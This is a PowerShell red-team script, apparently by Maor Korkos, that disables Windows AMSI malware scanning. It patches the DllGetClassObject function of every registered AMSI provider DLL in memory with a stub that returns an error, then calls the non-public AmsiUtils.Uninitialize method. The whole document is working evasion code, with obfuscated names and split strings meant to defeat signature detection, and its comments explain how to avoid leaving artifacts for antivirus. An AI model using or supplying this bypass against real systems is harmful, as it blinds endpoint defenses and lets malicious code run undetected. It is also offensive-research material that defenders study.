# Write-Host "AMSI providers' initialization interception"
# Write-Host "-- Maor Korkos (@maorkor)"

# Call Windows APIs with reflection (crediton reflection: http://redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass)
# Add-Type causes the code to be written to a temporary file on the disk, then csc.exe is used to compile this code into a binary
# Artifacts on disk may cause AV detection, solution - reflection

# Providers registry enumeration implemented by: https://github.com/R-Secure/AMSI-Bypasses

function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $CloudyEight,
        [Parameter(Position = 1, Mandatory = $True)] [String] $AnglePoised
    )

    # Get a reference to System.dll in the GAC
    $HorsesOval = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $DarkObject = $HorsesOval.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $BruiseSix = $DarkObject.GetMethod('GetModuleHandle')
    $MeltedLazy = $DarkObject.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Get a handle to the module specified
    $BlindKick = $BruiseSix.Invoke($null, @($CloudyEight))
    $EmployDesire = ne`w-ob`je`ct IntPtr
    $MuddleSudden = ne`w-ob`je`ct System.Runtime.InteropServices.HandleRef($EmployDesire, $BlindKick)
    # Return the address of the function
    return $MeltedLazy.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$MuddleSudden, $AnglePoised))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $UpsetTrick = (ne`w-ob`je`ct Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $GateSongs = [Void]
    )

    $MagicIsland = [AppDomain]::CurrentDomain
    $ZebraAfford = ne`w-ob`je`ct System.Reflection.AssemblyName('ReflectedDelegate')
    $CactusJazzy = $MagicIsland.DefineDynamicAssembly($ZebraAfford, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $CrashEffect = $CactusJazzy.DefineDynamicModule('InMemoryModule', $false)
    $ClassyDrown = $CrashEffect.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $MatchTreat = $ClassyDrown.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $UpsetTrick)
    $MatchTreat.SetImplementationFlags('Runtime, Managed')
    $MoonFlimsy = $ClassyDrown.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $GateSongs, $UpsetTrick)
    $MoonFlimsy.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $ClassyDrown.CreateType()
}
$DryPause = Get-ProcAddress kernel32.dll LoadLibraryA
$CallWriter = Get-DelegateType @([String]) ([IntPtr])
$SufferTender = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DryPause,
$CallWriter)
$PeckRay = Get-ProcAddress kernel32.dll GetProcAddress
$NimbleSmell = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$MeltedLazy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PeckRay,
$NimbleSmell)
$RingPause = Get-ProcAddress kernel32.dll VirtualProtect
$IgnorePest = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$PostSize = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RingPause,
$IgnorePest)

$MarkedClass = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
$ChangeAloof = 0

foreach ($BaitShort in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
{
    $PetiteMuddle = 'HKLM:\Software\Classes\CLSID\' + $BaitShort + '\InprocServer32'
    $PasteBeef = Get-ItemPropertyValue -Name '(Default)' $PetiteMuddle -ErrorAction SilentlyContinue
    if ($PasteBeef)
    {
        $LazyOafish = Split-Path $PasteBeef -leaf
        $HorsesDrain = $LazyOafish -replace '"', ""
        $CannonPuffy = $SufferTender.Invoke($HorsesDrain) 
        if ($CannonPuffy -ne 0)
        {
            Write-host "[*] Provider found - " $LazyOafish
            $BanVessel = $MeltedLazy.Invoke($CannonPuffy, "DllGetClassObject")        
            $PostSize.Invoke($BanVessel, [uint32]$MarkedClass.Length, 0x40, [ref]$ChangeAloof)
            [System.Runtime.InteropServices.Marshal]::Copy($MarkedClass, 0, $BanVessel, $MarkedClass.Length)
        }
    }
}

$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$QuaintThroat = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$QuaintThroat.Invoke($object,$null)
